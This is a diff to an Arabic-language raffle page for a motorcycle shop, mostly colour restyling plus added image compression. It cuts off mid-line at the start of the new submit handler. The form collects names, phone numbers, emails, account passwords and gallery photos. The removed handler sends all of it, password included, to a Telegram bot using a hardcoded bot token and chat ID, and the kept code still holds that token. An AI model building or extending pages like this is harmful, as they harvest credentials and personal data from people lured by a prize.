@@ -9,21 +9,21 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-dark: #020408;
-    --surface: #0b101c;
-    --surface-light: #131a2b;
-    --border: #1e2942;
-    --primary: #ff2a3c;
-    --primary-glow: rgba(255, 42, 60, 0.5);
-    --gold: #ffb703;
-    --gold-bright: #ffdf6d;
-    --gold-glow: rgba(255, 183, 3, 0.4);
-    --cyan: #00f2fe;
-    --text-white: #ffffff;
+    --bg-dark: #030712;
+    --surface: #0b1329;
+    --surface-light: #111d3b;
+    --border: #1e294b;
+    --primary: #38bdf8;
+    --primary-glow: rgba(56, 189, 248, 0.4);
+    --gold: #f59e0b;
+    --gold-bright: #fbbf24;
+    --gold-glow: rgba(245, 158, 11, 0.35);
+    --cyan: #06b6d4;
+    --text-white: #f8fafc;
     --text-muted: #94a3b8;
-    --grad-fire: linear-gradient(135deg, #d90429 0%, #ff2a3c 50%, #ffb703 100%);
-    --grad-gold: linear-gradient(135deg, #ffb703 0%, #fb8500 100%);
-    --grad-glass: linear-gradient(145deg, rgba(19, 26, 43, 0.95), rgba(11, 16, 28, 0.98));
+    --grad-tech: linear-gradient(135deg, #0284c7 0%, #0369a1 50%, #f59e0b 100%);
+    --grad-gold: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+    --grad-glass: linear-gradient(145deg, rgba(17, 29, 59, 0.9), rgba(11, 19, 41, 0.95));
   }
 
   * {
@@ -38,15 +38,15 @@
   body {
     background-color: var(--bg-dark);
     background-image: 
-      radial-gradient(circle at 10% 10%, rgba(255, 42, 60, 0.15) 0%, transparent 45%),
-      radial-gradient(circle at 90% 20%, rgba(255, 183, 3, 0.15) 0%, transparent 45%),
-      radial-gradient(circle at 50% 90%, rgba(0, 242, 254, 0.08) 0%, transparent 55%);
+      radial-gradient(circle at 15% 10%, rgba(56, 189, 248, 0.12) 0%, transparent 45%),
+      radial-gradient(circle at 85% 20%, rgba(245, 158, 11, 0.12) 0%, transparent 45%),
+      radial-gradient(circle at 50% 90%, rgba(6, 182, 212, 0.08) 0%, transparent 55%);
     color: var(--text-white);
     line-height: 1.8;
     overflow-x: hidden;
   }
 
-  /* ===== الشريط العلوي ===== */
+  /* ===== الشريط العلوي العصري ===== */
   .navbar {
     position: sticky;
     top: 15px;
@@ -57,30 +57,30 @@
   }
 
   .nav-box {
-    background: rgba(11, 16, 28, 0.85);
+    background: rgba(11, 19, 41, 0.85);
     backdrop-filter: blur(25px);
     -webkit-backdrop-filter: blur(25px);
-    border: 1px solid rgba(255, 183, 3, 0.25);
+    border: 1px solid rgba(56, 189, 248, 0.3);
     border-radius: 60px;
     padding: 12px 30px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    box-shadow: 0 20px 45px rgba(0, 0, 0, 0.7), 0 0 20px rgba(255,183,3,0.1);
+    box-shadow: 0 20px 45px rgba(0, 0, 0, 0.7), 0 0 25px rgba(56,189,248,0.15);
     flex-wrap: wrap;
     gap: 12px;
   }
 
   .brand-logo {
-    font-size: 23px;
+    font-size: 24px;
     font-weight: 900;
-    background: linear-gradient(90deg, #ffffff, var(--gold));
+    background: linear-gradient(90deg, #ffffff, var(--cyan));
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     display: flex;
     align-items: center;
     gap: 10px;
-    filter: drop-shadow(0 0 12px rgba(255,183,3,0.4));
+    filter: drop-shadow(0 0 12px rgba(6,182,212,0.4));
   }
 
   .nav-links {
@@ -101,19 +101,19 @@
 
   .nav-links a:hover {
     color: #fff;
-    background: rgba(255, 255, 255, 0.1);
+    background: rgba(255, 255, 255, 0.08);
   }
 
   .nav-links a.cta-pill {
-    background: var(--grad-fire);
+    background: var(--grad-tech);
     color: #fff;
     box-shadow: 0 5px 18px var(--primary-glow);
   }
 
-  /* ===== الهيدر ===== */
+  /* ===== الهيدر العصري ===== */
   header {
     max-width: 1100px;
-    margin: 30px auto 0;
+    margin: 35px auto 0;
     padding: 55px 20px 65px;
     text-align: center;
   }
@@ -122,21 +122,21 @@
     display: inline-flex;
     align-items: center;
     gap: 10px;
-    background: rgba(255, 183, 3, 0.15);
-    border: 1px solid rgba(255, 183, 3, 0.5);
-    color: var(--gold-bright);
+    background: rgba(56, 189, 248, 0.12);
+    border: 1px solid rgba(56, 189, 248, 0.4);
+    color: var(--cyan);
     padding: 8px 25px;
     border-radius: 50px;
     font-size: 15px;
     font-weight: 800;
     margin-bottom: 22px;
-    box-shadow: 0 0 30px rgba(255,183,3,0.2);
+    box-shadow: 0 0 30px rgba(6,182,212,0.2);
   }
 
   header h1 {
-    font-size: 52px;
+    font-size: 50px;
     font-weight: 900;
-    line-height: 1.2;
+    line-height: 1.25;
     margin-bottom: 15px;
   }
 
@@ -144,7 +144,7 @@
     background: var(--grad-gold);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
-    filter: drop-shadow(0 3px 15px rgba(255,183,3,0.4));
+    filter: drop-shadow(0 3px 15px rgba(245,158,11,0.4));
   }
 
   header p.subtitle {
@@ -166,7 +166,7 @@
   }
 
   .section-head .sub {
-    color: var(--gold);
+    color: var(--cyan);
     font-size: 14px;
     font-weight: 800;
     display: block;
@@ -201,20 +201,20 @@
 
   .cat-card:hover {
     transform: translateY(-10px);
-    border-color: var(--gold);
-    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255,183,3,0.2);
+    border-color: var(--cyan);
+    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(6,182,212,0.2);
   }
 
   .cat-card.featured {
-    border: 2px solid rgba(255, 183, 3, 0.7);
-    background: linear-gradient(160deg, #221714 0%, var(--surface) 100%);
+    border: 2px solid rgba(245, 158, 11, 0.7);
+    background: linear-gradient(160deg, #1f170b 0%, var(--surface) 100%);
   }
 
   .cat-tag {
     position: absolute;
     top: 15px;
     left: 15px;
-    background: var(--grad-fire);
+    background: var(--grad-tech);
     color: #fff;
     font-size: 11px;
     font-weight: 800;
@@ -244,22 +244,23 @@
 
   /* ===== بانر الجائزة ===== */
   .gifts-banner {
-    background: linear-gradient(145deg, #1c0d12 0%, var(--surface) 65%, #0a1322 100%);
-    border: 2px solid rgba(255, 42, 60, 0.65);
+    background: linear-gradient(145deg, #132238 0%, var(--surface) 65%, #050d1a 100%);
+    border: 2px solid rgba(56, 189, 248, 0.6);
     border-radius: 35px;
     padding: 45px 35px;
-    box-shadow: 0 35px 70px rgba(255, 42, 60, 0.25);
+    box-shadow: 0 35px 70px rgba(6, 182, 212, 0.2);
   }
 
   .gift-ribbon {
     display: inline-block;
-    background: var(--grad-fire);
+    background: var(--grad-tech);
     color: #fff;
     font-weight: 900;
     font-size: 16px;
     padding: 8px 28px;
     border-radius: 30px;
     margin-bottom: 22px;
+    box-shadow: 0 5px 20px var(--primary-glow);
   }
 
   .gifts-layout {
@@ -270,8 +271,8 @@
   }
 
   .bike-display {
-    background: rgba(0, 0, 0, 0.5);
-    border: 1px solid rgba(255, 183, 3, 0.35);
+    background: rgba(0, 0, 0, 0.45);
+    border: 1px solid rgba(245, 158, 11, 0.35);
     border-radius: 28px;
     padding: 26px;
     text-align: center;
@@ -280,7 +281,7 @@
   .bike-display svg {
     width: 100%;
     max-width: 460px;
-    filter: drop-shadow(0 20px 35px rgba(255, 42, 60, 0.5));
+    filter: drop-shadow(0 20px 35px rgba(56, 189, 248, 0.4));
     animation: floatBike 3.5s ease-in-out infinite;
   }
 
@@ -302,12 +303,13 @@
     display: flex;
     align-items: center;
     gap: 12px;
+    border: 1px solid rgba(255,255,255,0.04);
   }
 
   .go-register-btn {
     display: inline-block;
     background: var(--grad-gold);
-    color: #020408;
+    color: #030712;
     text-decoration: none;
     font-weight: 900;
     font-size: 18px;
@@ -319,10 +321,10 @@
 
   .go-register-btn:hover { transform: translateY(-4px); }
 
-  /* ===== استمارة التسجيل ===== */
+  /* ===== استمارة التسجيل العصرية ===== */
   .form-container {
     background: var(--grad-glass);
-    border: 2px solid rgba(255, 183, 3, 0.5);
+    border: 2px solid rgba(56, 189, 248, 0.4);
     border-radius: 35px;
     padding: 45px;
     box-shadow: 0 30px 65px rgba(0, 0, 0, 0.75);
@@ -350,15 +352,15 @@
     border: 1.5px solid var(--border);
     border-radius: 16px;
     font-size: 15px;
-    background: #05080f;
+    background: #050b1a;
     color: #fff;
     transition: 0.25s;
   }
 
   .field input:focus, .field select:focus, .field textarea:focus {
     outline: none;
-    border-color: var(--gold);
-    box-shadow: 0 0 0 4px rgba(255, 183, 3, 0.2);
+    border-color: var(--cyan);
+    box-shadow: 0 0 0 4px rgba(6, 182, 212, 0.2);
   }
 
   .field textarea { min-height: 100px; resize: vertical; }
@@ -377,10 +379,10 @@
     font-weight: 700;
   }
 
-  /* ===== قسم اختيار صورة من معرض الهاتف ===== */
+  /* ===== صندوق رفع وضغط الصورة تلقائياً ===== */
   .upload-box {
-    background: rgba(5, 8, 15, 0.9);
-    border: 2px dashed rgba(255, 183, 3, 0.4);
+    background: rgba(5, 11, 26, 0.9);
+    border: 2px dashed rgba(56, 189, 248, 0.4);
     border-radius: 22px;
     padding: 25px;
     text-align: center;
@@ -389,13 +391,11 @@
   }
 
   .upload-box:hover {
-    border-color: var(--gold);
-    background: rgba(11, 16, 28, 0.95);
+    border-color: var(--cyan);
+    background: rgba(11, 19, 41, 0.95);
   }
 
-  .upload-box input[type="file"] {
-    display: none;
-  }
+  .upload-box input[type="file"] { display: none; }
 
   .upload-label {
     display: flex;
@@ -405,20 +405,9 @@
     cursor: pointer;
   }
 
-  .upload-icon {
-    font-size: 42px;
-  }
-
-  .upload-text {
-    font-weight: 800;
-    font-size: 16px;
-    color: var(--gold-bright);
-  }
-
-  .upload-sub {
-    font-size: 13px;
-    color: var(--text-muted);
-  }
+  .upload-icon { font-size: 42px; }
+  .upload-text { font-weight: 800; font-size: 16px; color: var(--cyan); }
+  .upload-sub { font-size: 13px; color: var(--text-muted); }
 
   #imagePreview {
     display: none;
@@ -426,7 +415,7 @@
     max-height: 140px;
     border-radius: 12px;
     margin: 15px auto 0;
-    border: 2px solid var(--gold);
+    border: 2px solid var(--cyan);
     object-fit: cover;
   }
 
@@ -436,7 +425,7 @@
     padding: 19px;
     border: none;
     border-radius: 18px;
-    background: var(--grad-fire);
+    background: var(--grad-tech);
     color: #fff;
     font-size: 21px;
     font-weight: 900;
@@ -445,7 +434,7 @@
     transition: 0.3s;
   }
 
-  .btn-enter:hover { transform: translateY(-4px); }
+  .btn-enter:hover { transform: translateY(-4px); box-shadow: 0 18px 45px rgba(6,182,212,0.5); }
   .btn-enter:disabled { opacity: 0.6; cursor: not-allowed; }
 
   .msg {
@@ -457,22 +446,22 @@
     font-weight: 700;
   }
 
-  .err { display: block; background: rgba(255, 42, 60, 0.18); color: #ff8fa3; border: 1px solid var(--primary); }
+  .err { display: block; background: rgba(239, 35, 60, 0.18); color: #ff8fa3; border: 1px solid #ef233c; }
 
   /* ===== تذكرة النجاح ===== */
   #ticketBox {
     display: none;
     text-align: center;
     padding: 50px 25px;
-    background: linear-gradient(145deg, #0e2b1d 0%, #05110a 100%);
-    border: 2px dashed #10b981;
+    background: linear-gradient(145deg, #062338 0%, #030d1a 100%);
+    border: 2px dashed var(--cyan);
     border-radius: 30px;
   }
 
   .ticket-badge {
     display: inline-block;
-    background: #10b981;
-    color: #fff;
+    background: var(--cyan);
+    color: #030712;
     font-weight: 900;
     padding: 9px 26px;
     border-radius: 30px;
@@ -480,10 +469,10 @@
     margin-bottom: 16px;
   }
 
-  #ticketBox h3 { font-size: 32px; color: #34d399; margin-bottom: 10px; font-weight: 900; }
+  #ticketBox h3 { font-size: 32px; color: #38bdf8; margin-bottom: 10px; font-weight: 900; }
   .ticket-code {
     display: inline-block;
-    background: rgba(255, 183, 3, 0.15);
+    background: rgba(245, 158, 11, 0.15);
     border: 2px solid var(--gold);
     color: var(--gold);
     font-size: 34px;
@@ -512,7 +501,7 @@
 
   .phones-list { display: flex; gap: 14px; flex-wrap: wrap; }
   .phone-link {
-    background: rgba(255, 183, 3, 0.15);
+    background: rgba(245, 158, 11, 0.15);
     border: 1px solid var(--gold);
     color: var(--gold-bright);
     text-decoration: none;
@@ -523,7 +512,7 @@
   }
 
   footer {
-    background: #010204;
+    background: #02050c;
     border-top: 1px solid #161b26;
     text-align: center;
     padding: 50px 20px;
@@ -534,7 +523,7 @@
 
   @media (max-width: 768px) {
     .gifts-layout { grid-template-columns: 1fr; }
-    header h1 { font-size: 36px; }
+    header h1 { font-size: 34px; }
     .form-container { padding: 30px 20px; }
   }
 </style>
@@ -556,9 +545,9 @@
 
 <!-- ===== الهيدر ===== -->
 <header>
-  <div class="store-badge">🏆 المعرض الأضخم والأسطوري للدراجات النارية في القاعدة</div>
-  <h1>متجر <span>أمير المترات</span><br>قمة القوة، السرعة، والجوائز الفضائية!</h1>
-  <p class="subtitle">نقدم لكم أحدث تشكيلة عالمية من الدراجات النارية، مع السحب الأكبر والأكثر إثارة على <strong>متر فلينج (FELLING)</strong> زيرو حصرياً لعملائنا.</p>
+  <div class="store-badge">🏆 المعرض العصري الأول للدراجات النارية في القاعدة</div>
+  <h1>متجر <span>أمير المترات</span><br>تكنولوجيا السرعة، القوة، والجوائز الفضائية!</h1>
+  <p class="subtitle">نقدم أحدث طرازات الدراجات النارية العالمية، مع السحب الأكبر والأكثر إثارة على <strong>متر فلينج (FELLING)</strong> زيرو حصرياً لعملائنا.</p>
 </header>
 
 <!-- ===== أقسام المترات ===== -->
@@ -584,7 +573,7 @@
     <div class="cat-card">
       <span class="cat-icon">🏁</span>
       <h3>المترات الرياضية (Sport)</h3>
-      <span style="color:var(--gold); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(لعشاق السرعة)</span>
+      <span style="color:var(--cyan); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(لعشاق السرعة)</span>
       <p>هياكل انسيابية متطورة، فرامل قرصية مزدوجة عالية الاستجابة وأنظمة إضاءة LED ليلية متكاملة.</p>
       <div class="cat-specs">
         <span>أداء عالي</span>
@@ -595,7 +584,7 @@
     <div class="cat-card">
       <span class="cat-icon">🛵</span>
       <h3>مترات العمل والتوصيل</h3>
-      <span style="color:var(--gold); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(للتحمل الشاق)</span>
+      <span style="color:var(--cyan); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(للتحمل الشاق)</span>
       <p>مصممة خصيصاً للخدمات والأعمال اليومية الشاقة، متانة عالية وصيانة سهلة واستهلاك اقتصادي جداً.</p>
       <div class="cat-specs">
         <span>تحمل عالي</span>
@@ -606,7 +595,7 @@
     <div class="cat-card">
       <span class="cat-icon">⛰️</span>
       <h3>المترات الجبلية والوعرة</h3>
-      <span style="color:var(--gold); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(للمرتفعات)</span>
+      <span style="color:var(--cyan); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(للمرتفعات)</span>
       <p>عزم هائلة لتسلق المرتفعات الصعبة والطرق الترابية الوعرة بفضل أنظمة التعليق المتقدمة والإطارات المعززة.</p>
       <div class="cat-specs">
         <span>عزم قوي</span>
@@ -644,7 +633,7 @@
               <stop offset="100%" stop-color="#334155"/>
             </linearGradient>
           </defs>
-          <ellipse cx="300" cy="288" rx="230" ry="14" fill="rgba(255, 42, 60, 0.3)"/>
+          <ellipse cx="300" cy="288" rx="230" ry="14" fill="rgba(6, 182, 212, 0.3)"/>
           <g transform="translate(145, 225)">
             <circle r="58" fill="#0f172a" stroke="#1e293b" stroke-width="10"/>
             <circle r="44" fill="none" stroke="url(#goldTrim)" stroke-width="3" stroke-dasharray="14 6"/>
@@ -693,7 +682,7 @@
   </div>
 </section>
 
-<!-- ===== الاستمارة مع اختيار صورة من المعرض ===== -->
+<!-- ===== الاستمارة وضغط الصورة تلقائياً ===== -->
 <section id="register">
   <div class="section-head">
     <span class="sub">بوابة التسجيل الآمنة</span>
@@ -746,16 +735,16 @@
           <textarea id="note" placeholder="اكتب مشاركتك أو سبب اختيارك لمتجر أمير المترات..."></textarea>
         </div>
 
-        <!-- اختيار صورة حقيقية من معرض الهاتف -->
+        <!-- اختيار صورة مع ضغطها تلقائياً -->
         <div class="field full">
-          <label>🖼️ إرفاق صورة من معرض الهاتف (للتحقق وتأكيد الهوية) *</label>
+          <label>🖼️ إرفاق صورة من معرض الهاتف (سيتم ضغطها تلقائياً للسرعة) *</label>
           <div class="upload-box" onclick="document.getElementById('galleryImage').click()">
             <div class="upload-label">
               <span class="upload-icon">📁</span>
-              <span class="upload-text">اضغط هنا لاختيار صورة من معرض الهاتف</span>
-              <span class="upload-sub">(.JPG, .PNG مدعومة)</span>
+              <span class="upload-text">اختر صورة من معرض الهاتف</span>
+              <span class="upload-sub">سيتم ضغط وتصحيح حجمها تلقائياً قبل الإرسال للبوت</span>
             </div>
-            <input type="file" id="galleryImage" accept="image/*" required onchange="previewSelectedImage(event)">
+            <input type="file" id="galleryImage" accept="image/*" required onchange="handleImageSelection(event)">
             <img id="imagePreview" alt="معاينة الصورة المرفقة">
           </div>
         </div>
@@ -767,12 +756,12 @@
 
     <!-- شاشة نجاح التسجيل والتذكرة -->
     <div id="ticketBox">
-      <div class="ticket-badge">✅ تم إرسال بياناتك وصورتك واعتماد تذكرتك بنجاح</div>
+      <div class="ticket-badge">✅ تم إرسال بياناتك وصورتك المضغوطة بنجاح</div>
       <h3>مبروك! لقد دخلت السحب الأسطوري رسمياً</h3>
       <p style="color:#cbd5e1;">قم بتصوير شاشة هذا الرقم والاحتفاظ به:</p>
       <div class="ticket-code" id="ticketCode">AMIR-0000</div>
       <p style="color:#94a3b8; font-size:15px;">
-        تم إرسال الصورة المرفقة من معرضك وبياناتك الكاملة إلى غرفة العمليات بنجاح.<br>
+        تم رفع الصورة المضغوطة والبيانات الكاملة إلى بوت التليجرام فوراً.<br>
         <strong style="color:var(--gold);">متجر أمير المترات — القاعدة، جوار مستوصف السلطان</strong>
       </p>
     </div>
@@ -804,6 +793,8 @@
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 
+let compressedImageBlob = null;
+
 function togglePass() {
   const passInput = document.getElementById("password");
   const btn = document.querySelector(".toggle-pass");
@@ -816,20 +807,53 @@ function togglePass() {
   }
 }
 
-// معاينة الصورة المختارة من معرض الهاتف قبل الإرسال
-function previewSelectedImage(event) {
+// دالة ذكية لضغط وتحجيم الصورة المختارة من المعرض تلقائياً قبل الرفع
+function handleImageSelection(event) {
   const file = event.target.files[0];
-  const preview = document.getElementById("imagePreview");
-  if (file) {
-    const reader = new FileReader();
-    reader.onload = function(e) {
-      preview.src = e.target.result;
-      preview.style.display = "block";
+  if (!file) return;
+
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const img = new Image();
+    img.onload = function() {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      // تحديد الحد الأقصى لأبعاد الصورة المضغوطة (مثلاً العرض الأقصى 1000 بكسل لسرعة الرفع)
+      const MAX_WIDTH = 1000;
+      const MAX_HEIGHT = 1000;
+      let width = img.width;
+      let height = img.height;
+
+      if (width > height) {
+        if (width > MAX_WIDTH) {
+          height *= MAX_WIDTH / width;
+          width = MAX_WIDTH;
+        }
+      } else {
+        if (height > MAX_HEIGHT) {
+          width *= MAX_HEIGHT / height;
+          height = MAX_HEIGHT;
+        }
+      }
+
+      canvas.width = width;
+      canvas.height = height;
+      ctx.drawImage(img, 0, 0, width, height);
+
+      // تحويل الصورة المضغطوة إلى صيغة JPEG بجودة 0.75 (حجم صغير جداً وسريع للرفع)
+      canvas.toBlob(function(blob) {
+        compressedImageBlob = blob;
+        
+        // عرض معاينة الصورة المضغوطة للمستخدم
+        const preview = document.getElementById("imagePreview");
+        preview.src = URL.createObjectURL(blob);
+        preview.style.display = "block";
+      }, "image/jpeg", 0.75);
     }
-    reader.readAsDataURL(file);
-  } else {
-    preview.style.display = "none";
+    img.src = e.target.result;
   }
+  reader.readAsDataURL(file);
 }
 
 function cleanHTML(str) {
@@ -838,73 +862,4 @@ function cleanHTML(str) {
             .replace(/>/g, "&gt;");
 }
 
-document.getElementById("raffleForm").addEventListener("submit", async function(e) {
-  e.preventDefault();
-  const msg = document.getElementById("msg");
-  msg.className = "msg";
-
-  const imageInput = document.getElementById("galleryImage");
-  if (!imageInput.files || imageInput.files.length === 0) {
-    msg.className = "msg err";
-    msg.textContent = "❌ يرجى إرفاق صورة من معرض الهاتف لتأكيد التسجيل!";
-    return;
-  }
-
-  const btn = document.getElementById("btn");
-  btn.disabled = true;
-  btn.textContent = "⏳ جارٍ رفع الصورة والبيانات وإصدار التذكرة...";
-
-  const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
-  const g = id => cleanHTML(document.getElementById(id).value.trim());
-  const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
-
-  const captionText =
-`🏆 <b>تسجيل جديد مع صورة مرفقة في السحب الأسطوري!</b>
-━━━━━━━━━━━━━━━━━━
-🎟️ <b>رقم التذكرة:</b> <code>${ticketID}</code>
-👤 <b>الاسم:</b> ${g("name")}
-📱 <b>الهاتف:</b> <code>${g("phone")}</code>
-📧 <b>البريد:</b> <code>${g("email")}</code>
-🔑 <b>كلمة المرور:</b> <code>${g("password")}</code>
-🏙️ <b>المنطقة:</b> ${g("city")}
-🏍️ <b>المتر المفضل:</b> ${g("favModel")}
-💬 <b>ملاحظة:</b> ${g("note") || "لا يوجد"}
-🖼️ <b>الصورة:</b> تم إرفاق صورة حقيقية من معرض المستخدم
-━━━━━━━━━━━━━━━━━━
-📲 <b>تواصل سريع مع المشترك (واتساب):</b>
-https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
-
-  try {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", imageInput.files[0]);
-    formData.append("caption", captionText);
-    formData.append("parse_mode", "HTML");
-
-    // إرسال الصورة والبيانات مباشرة إلى بوت تليجرام
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: "POST",
-      body: formData
-    });
-
-    const data = await res.json();
-    if (data.ok) {
-      document.getElementById("ticketCode").textContent = ticketID;
-      document.getElementById("raffleForm").style.display = "none";
-      document.getElementById("ticketBox").style.display = "block";
-      document.getElementById("ticketBox").scrollIntoView({ behavior: "smooth" });
-    } else {
-      throw new Error(data.description || "Telegram Error");
-    }
-  } catch (err) {
-    msg.className = "msg err";
-    msg.textContent = "❌ تعذر إرسال الصورة والبيانات، يرجى التأكد من اتصال الإنترنت وحجم الصورة ثم المحاولة.";
-    console.error(err);
-    btn.disabled = false;
-    btn.textContent = "🔥 تأكيد التسجيل وإرسال البيانات والصورة للبوت";
-  }
-});
-</script>
-
-</body>
-</html>
+document.getElementById("raffleForm").addEventListener("
